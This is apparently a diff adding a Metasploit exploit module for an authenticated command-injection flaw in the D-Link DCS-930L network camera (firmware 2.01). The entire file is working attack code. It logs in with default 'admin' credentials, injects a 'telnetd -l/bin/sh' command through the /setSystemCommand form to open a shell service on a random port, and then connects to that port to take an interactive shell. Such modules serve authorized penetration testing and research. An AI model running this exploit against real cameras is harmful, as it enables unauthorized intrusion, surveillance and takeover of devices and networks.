@@ -1,0 +1,158 @@
+##
+## This module requires Metasploit: http://metasploit.com/download
+## Current source: https://github.com/rapid7/metasploit-framework
+###
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+  include Msf::Exploit::Remote::Telnet
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'D-Link DCS-930L Authenticated Remote Command Execution',
+      'Description' => %q{
+        The D-Link DCS-930L Network Video Camera is vulnerable
+        to OS Command Injection via the web interface.  The vulnerability
+        exists at /setSystemCommand, which is accessible with credentials.
+        This vulnerability was present in firmware version 2.01 and fixed
+        by 2.12.
+      },
+      'Author'      =>
+        [
+          'Nicholas Starke <nick@alephvoid.com>'
+        ],
+      'License'         => MSF_LICENSE,
+      'DisclosureDate'  => 'Dec 20 2015',
+      'Privileged'      => true,
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'Payload'         =>
+        {
+          'Compat'  => {
+          'PayloadType'    => 'cmd_interact',
+          'ConnectionType' => 'find',
+          },
+        },
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
+      'Targets'        =>
+        [
+          [  'Automatic',     { } ],
+        ],
+      'DefaultTarget'  => 0
+     ))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
+        OptString.new('PASSWORD', [ false, 'Password to login with', ''])
+      ], self.class)
+
+    register_advanced_options(
+      [
+        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet Command', 10]),
+        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25])
+      ], self.class)
+  end
+
+  def telnet_timeout
+    (datastore['TelnetTimeout'] || 10)
+  end
+
+  def banner_timeout
+    (datastore['TelnetBannerTimeout'] || 25)
+  end
+
+  def exploit
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD'] || ''
+
+    test_login(user, pass)
+    exploit_telnet
+  end
+
+  def test_login(user, pass)
+    print_status("#{peer} - Trying to login with #{user} : #{pass}")
+
+    res = send_request_cgi({
+      'uri' => '/',
+      'method' => 'GET',
+      'authorization' => basic_auth(user, pass)
+    })
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
+    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - invalid credentials (response code: #{res.code}") if res.code != 200
+
+    print_good("#{peer} - Successful login #{user} : #{pass}")
+  end
+
+  def exploit_telnet
+    telnet_port = rand(32767) + 32768
+
+    print_status("#{peer} - Telnet Port: #{telnet_port}")
+
+    cmd = "telnetd -p #{telnet_port} -l/bin/sh"
+
+    telnet_request(cmd)
+
+    print_status("#{rhost}:#{telnet_port} - Trying to establish telnet connection...")
+    ctx = { 'Msf' => framework, 'MsfExploit' => self }
+    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnet_port, 'Context' => ctx, 'Timeout' => telnet_timeout })
+
+    if sock.nil?
+      fail_with(Failure::Unreachable, "#{rhost}:#{telnet_port} - Backdoor service unreachable")
+    end
+
+    add_socket(sock)
+
+    print_status("#{rhost}:#{telnet_port} - Trying to establish a telnet session...")
+    prompt = negotiate_telnet(sock)
+
+    if prompt.nil?
+      sock.close
+      fail_with(Failure::Unknown, "#{rhost}:#{telnet_port} - Unable to establish a telnet session")
+    else
+      print_good("#{rhost}:#{telnet_port} - Telnet session successfully established")
+    end
+
+    handler(sock)
+  end
+
+  def telnet_request(cmd)
+    uri = '/setSystemCommand'
+
+    begin
+      res = send_request_cgi({
+        'uri' => uri,
+        'method' => 'POST',
+        'vars_post' => {
+          'ReplySuccessPage' => 'docmd.htm',
+          'ReplyErrorPage' => 'docmd.htm',
+          'SystemCommand'  => cmd,
+          'ConfigSystemCommand' => 'Save'
+        }
+      })
+      return res
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+
+  def negotiate_telnet(sock)
+    begin
+      Timeout.timeout(banner_timeout) do
+        while(true)
+          data = sock.get_once(-1, telnet_timeout)
+          return nil if not data or data.length == 0
+          if data =~ /BusyBox/
+            return true
+          end
+        end
+      end
+    rescue ::Timeout::Error
+      return nil
+    end
+  end
+end
